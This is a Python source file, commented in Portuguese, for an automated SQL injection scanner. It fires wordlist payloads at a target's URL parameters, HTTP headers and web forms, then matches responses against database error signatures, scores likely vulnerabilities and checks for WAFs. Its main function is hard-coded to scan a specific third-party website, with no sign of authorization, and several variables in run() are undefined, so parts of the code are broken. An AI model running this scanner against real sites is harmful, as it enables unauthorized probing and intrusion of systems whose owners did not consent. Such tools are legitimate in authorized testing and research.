import re
import asyncio
import random

import utils
import jsonlog
import supplementary
from Request import Request

class SQLI:
    def __init__(self, target, wordlist_file='wordlists/xss/default.txt', option='forms', save_file='output.json',
                 ua_status=False, headers=None, cookies=None, timeout=10, SSL=True, proxies=None,
                 interval=0, continue_=False, try_requests=1, verbose=True):

        self.target = utils.normalize_url(target, SSL)
        self.wordlist_file = wordlist_file
        self.option = option
        self.save_file = save_file if save_file.endswith('.json') else f'{save_file.rsplit(".", 1)[0]}.json'
        self.ua_status = ua_status
        self.headers = headers
        self.cookies = cookies
        self.timeout = timeout
        self.SSL = SSL
        self.proxies = proxies
        self.interval = interval
        self.continue_ = continue_
        self.try_requests = try_requests
        self.verbose = verbose
    
    
    # SCORE SQLI SYSTEM
    # payload   -> carga enviada
    # response  -> resposta bruta da requisicao 
    async def sqli_score_system(self, payload, response):
        score = 5  # Pontuação inicial, pre-validado (max: 20pts)
        dbase_types = ['mysql', 'postgresql', 'sqlserver', 'oracle', 'mongodb', 'sqlite', 'redis', 'db2', 'mariadb', 'cockroachdb']
        suspicious = {
            'response_length': 3 if len(response.text) > 1500 else 2 if len(response.text) < 200 else 0,
            'response_time': 6 if response.elapsed.total_seconds() > 10 else 4 if response.elapsed.total_seconds() > 5 else 0,
            'response_code': 3 if response.status_code == 500 else 2 if response.status_code == 403 else 0,
            'response_header': 3 if "X-Powered-By" in response.headers and any(b in response.headers.get('X-Powered-By', '').lower() for b in dbase_types) else 0,
        }
        score += sum(v for v in suspicious.values())
        return score
    

    # TRABALHAR O RESPONSE_ANALYZER
    # payload   -> carga enviada
    # response  -> resposta bruta da request
    async def response_analyzer(self, payload, response):
        score = 0
        details = {}
        banner = ""
        error_messages = {
            'mysql': [
                r"You have an error in your SQL syntax", r"mysql", r"SQL syntax", 
                r"Query failed", r"database error", r"invalid query", r"incorrect syntax", 
                r"error in your SQL syntax", r"unclosed quotation mark", r"unexpected EOF", 
                r"unexpected token", r"unable to execute", r"invalid input"
            ],
            'postgresql': [
                r"syntax error", r"invalid input syntax for type", r"pg_sleep", 
                r"unrecognized statement", r"failed to open", r"unrecognized variable", 
                r"missing FROM-clause entry", r"division by zero", r"invalid regular expression"
            ],
            'sqlserver': [
                r"Msg \d+", r"Incorrect syntax", r"WAITFOR DELAY", r"incorrect syntax near", 
                r"conversion failed when converting the varchar value", 
                r"cannot insert the value", r"unclosed quotation mark after the character string", 
                r"Invalid object name", r"Arithmetic overflow error"
            ],
            'oracle': [
                r"ORA-\d+:.*", r"SQL command not properly ended", r"missing expression", r"invalid number", 
                r"invalid identifier", r"ORA-00933:.*", r"ORA-01756:.*", r"ORA-00904:.*", 
                r"ORA-01428:.*", r"ORA-01476:.*", r"ORA-12899: value too large for column.*"
            ],
            'mongodb': [
                r"SyntaxError: Unexpected token.*", 
                r"FieldError: Unknown field.*", 
                r"BSONObj size.*", r"MongoError:", r"Cannot apply \$.*", 
                r"Unterminated string in JSON.*"
            ],
            'sqlite': [
                r"SQLite error:.*", r"no such column:.*", r"datatype mismatch", 
                r"UNIQUE constraint failed.*", r"near \"\": syntax error", 
                r"unrecognized token:.*", r"too many SQL variables", 
                r"attempt to write a readonly database"
            ],
            'redis': [
                r"ERR unknown command.*", r"ERR syntax error", r"WRONGTYPE Operation.*", 
                r"OUT OF MEMORY", r"BUSY Redis is busy running a script"
            ],
            'db2': [
                r"SQLCODE=-\d+", r"DB2 SQL Error:.*", r"SQLSTATE=.*", 
                r"SQLCODE: -302", r"SQLERRMC=.*", 
                r"A character that is not valid.*"
            ],
            'mariadb': [
                r"You have an error in your SQL syntax", r"MariaDB server version.*", 
                r"incorrect parameter count in the call to native function.*", 
                r"Query execution failed.*"
            ],
            'cockroachdb': [
                r"unexpected value", r"invalid syntax", r"pq: syntax error", 
                r"relation .* does not exist", r"column .* does not exist"
            ],
        }

        # SCORE SQLI POSSIBILITIES
        score = await self.sqli_score_system(payload, response)
        details['sqli_score'] = score

        for k, v in error_messages.items(): # itera sobre o dicionario
            # if any(re.search(error_msg.lower(), response.text.lower()) for error_msg in v): # verifica o tipo de erro no retorno
            for error_msg in v:
                if re.search(error_msg.lower(), response.text.lower(), re.IGNORECASE | re.DOTALL):
                    details['database_type'] = k
                    details['potential_sqli'] = True
                    
                    print(f'{" "*3}[>][{utils.time_now()}][{response.status_code}] Possivel vulnerabilidade: {self.target} -> {payload}')
                    print(f'{" "*3}[>] Tipo: {k} Msg: {error_msg} url: {response.url} Score: {score}')
                else:
                    details['potential_sqli'] = False

        # WAF DETECTION
        details['waf'] = await supplementary.waf_detection(response) # verifica a chance de ter waf

        # BANNER CAPTURE
        banner = response.text if response.status_code in [301, 302, 307] else response.text[:500] # recolhe amostra do http

        return details, score, banner
        
    
    # ENGINE
    # 
    async def engine(self, payload, url, method='GET', params=None, headers=None):
        
        await asyncio.sleep(self.interval)
        
        print(f'[+][{utils.time_now()}] Tentando: {url}')
        
        # REQUISICAO
        status, r = Request(url, timeout=self.timeout, SSL=self.SSL, method=method, params=params,
                            proxies=self.proxies, headers=headers or self.headers,
                            cookies=self.cookies, ua_status=self.ua_status, redirect=False,
                            try_requests=self.try_requests).request()
        
        if self.verbose:
            print(f'{" "*3}[>][{utils.time_now()}] Payload: {payload}')
        
        if status:
            # ANALYSIS RESPONSE
            details, score, banner = await self.response_analyzer(payload, r)
            print(f'[#][{utils.time_now()}][{r.status_code}] Possivel vulnerabilidade: {self.target} -> {payload}')
            
        else:
            print(f'{" "*3}[>][{utils.time_now()}] Falha ao requisitar: {r}')
            details, score, banner = {}, 0, ''

        # LOG
        json_obj = jsonlog.ObjectJsonCommon.from_data(
            domain=self.target, payload=payload, url=url,
            ip='', r=r, banner=banner, details=details
        )
        await jsonlog.AsyncLogger(self.save_file).json_write(json_obj)
        return details, score, banner
    
    # RUN
    # RUN | CARCASE | SCRAG | ANATOMY
    async def run(self):
        
        # CARGA PESADA
        wordlist_file = self.wordlist_file
        if wordlist_file is None:
            print(f'[#][{utils.time_now()}] Usando payloads padrao')
            wordlist_file = 'wordlists/sqli/default_payload.txt'

        status_payload, payloads = await utils.fileReader(wordlist_file)
        if not status_payload:
            print(f'[-][{utils.time_now()}] {payloads}')
            return False, payloads
        
        payloads = [p.strip() for p in payloads if p.strip()]
        
        
        # QUERY STRING
        if self.option == 'query-string':
            if '*' not in self.target:
                print(f'[#][{utils.time_now()}] Nenhum parametro para substituicao encontrado (*)')
                return False, f'[#][{utils.time_now()}] Nao encontrado parametro para substituicao (*)'
            
            for payload in payloads:
                start_engine = await self.engine(payload, self.target.replace('*', payload))
                if start_engine[0].get('potential_sqli') == True and not continue_:
                    print(f'[#][{utils.time_now()}][{response.status_code}] Possivel vulnerabilidade: {self.target} -> {payload}')
            
            return True, f'[#][{utils.time_now()}] Finalizado com {self.wordlist_file} → {self.save_file}'
        
        
        # HEADERS
        if self.option == 'headers':
            total_combinations = len(payloads) ** 3
            used_combinations = set()

            while len(used_combinations) < total_combinations:
                current_headers = {
                    'User-Agent': random.choice(payloads).strip(),
                    'Referer': random.choice(payloads).strip(),
                    'X-Forwarded-For': random.choice(payloads).strip(),
                }
                combo_key = frozenset(current_headers.items())
                if combo_key in used_combinations:
                    continue

                used_combinations.add(combo_key)
                url = f"{self.target.split('://')[0]}://{self.target.split('://')[1]}" if self.target.startswith('http://') or self.target.startswith('https://') else f'https://{self.target}' if SSL else f'http://{self.target}'  # aqui o payload está no header, não na URL
                await self.engine(f'UA:{current_headers["User-Agent"]}|Ref:{current_headers["Referer"]}|IP:{current_headers["X-Forwarded-For"]}', url, headers=current_headers)
            
            return True, f'[#][{utils.time_now()}] Finalizado com {self.wordlist_file} → {self.save_file}'
        
        
        # FORMS
        if self.option == 'forms':
            method = 'GET'
            status_forms, forms = await supplementary.get_all_forms(self.target)
            if not status_forms or not forms:
                return False, f'[#][{utils.time_now()}] Nenhum formulário encontrado.'
            for payload in payloads:
                for form in forms:
                    form_details = await supplementary.get_form_details(form, payload)
                    action = form_details['action']
                    url = utils.merge_url(self.target, action) if action else self.target
                    method = form_details['method'].upper()
                    params = {inp['name']: inp['value'] for inp in form_details['inputs']}
                    await self.engine(payload, url, method=method, params=params)
            return True, f'[#][{utils.time_now()}] Finalizado com {self.wordlist_file} → {self.save_file}'    

        
        else:
            print(f'[#][{utils.time_now()}] Opcao informada inexistente')
            return False, f'[#][{utils.time_now()}] Opcao informada inexistente'



# MAIN
async def main():
    scanner = SQLI(
        target='https://www.socasadas.com/',
        wordlist_file='wordlists/sqli/default.txt',
        option='forms',
        save_file='xsss_objetct.json',
        verbose=True
    )
    status, result = await scanner.run()
    print(result)


if __name__ == '__main__':
    asyncio.run(main())
